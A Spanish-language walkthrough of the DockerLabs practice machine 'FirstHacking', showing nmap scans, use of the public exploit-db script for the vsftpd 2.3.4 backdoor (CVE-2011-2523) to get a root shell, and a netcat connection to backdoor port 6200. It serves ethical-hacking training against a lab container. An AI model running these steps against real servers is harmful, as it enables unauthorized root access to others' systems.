---
title: FirstHacking
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-03
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-firsthacking/firsthacking_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - ftp
  - tcp
  - cve
  - information_gathering
  - cve_exploitation
  - backdoor

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/firsthacking:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.046 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.046/0.046/0.046/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/firsthacking:-$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 21/open/tcp//ftp///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```
/home/kali/Documents/dockerlabs/firsthacking:-$ sudo nmap -sCV -p21 -vvv -oN nmap2 127.17.0.2
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
Service Info: OS: Unix
```

---
## CVE Exploitation

El escaneo revela que en el puerto 21 está corriendo ```vsftpd``` versión ```2.3.4```, busco exploits públicos relacionados usando searchsploit.

```terminal
/home/kali/Documents/dockerlabs/firsthacking:-$ searchsploit vsftpd 2.3.4
```

![](assets/img/dockerlabs-writeup-firsthacking/firsthacking1.png)

```terminal
/home/kali/Documents/dockerlabs/firsthacking:-$ cp /usr/share/exploitdb/exploits/unix/remote/49757.py .
```

Este exploit está escrito en Python y requiere la instalación de la librería [telnetlib3](https://pypi.org/project/telnetlib3/). Para instalarla, utilizo pip en un entorno virtual de Python.

```terminal
(Entorno_Python)-/home/kali/Documents/dockerlabs/firsthacking:-$ pip install telnetlib3
```

El exploit tiene éxito y me otorga acceso a una shell con privilegios de root en el sistema.

```terminal
(Entorno_Python)-/home/kali/Documents/dockerlabs/firsthacking:-$ python3 49757.py 127.17.0.2
/home/kali/Documents/dockerlabs/firsthacking/49757.py:11: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  from telnetlib import Telnet
Success, shell opened
Send `exit` to quit shell
id
uid=0(root) gid=0(root) groups=0(root)
```

> Para explotar esta misma vulnerabilidad con Metasploit, consultar el writeup [Tproot](https://litio7.github.io/posts/dockerlabs-writeup-tproot/).
{: .prompt-tip }

---
## Backdoor

La vulnerabilidad [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) está relacionada con un backdoor que se introduce cuando el servicio FTP es comprometido. Este backdoor abre el puerto 6200 y permite conexiones entrantes, para obtener acceso a la máquina afectada.

```terminal
/home/kali/Documents/dockerlabs/firsthacking:-$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv -oG nmap1.2 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 21/open/tcp//ftp///, 6200/open/tcp//lm-x///      Ignored State: closed (65533)

/home/kali/Documents/dockerlabs/firsthacking:-$ sudo nmap -sCV -p21,6200 -vvv -oN nmap2.2 127.17.0.2
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.3.4
6200/tcp open  lm-x?   syn-ack ttl 64
| fingerprint-strings: 
|   GenericLines: 
|     sh: 1: 
|     found
|_    found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6200-TCP:V=7.94SVN%I=7%D=1/3%Time=67785E8D%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,28,"sh:\x201:\x20\r:\x20not\x20found\nsh:\x202:\x20\r:\x20
SF:not\x20found\n");
Service Info: OS: Unix
```

A través del puerto 6200, es posible conectarse a la máquina utilizando Netcat y obtener acceso con privilegios de root.

```terminal
/home/kali/Documents/dockerlabs/firsthacking:-$ nc 127.17.0.2 6200
id
uid=0(root) gid=0(root) groups=0(root)
```
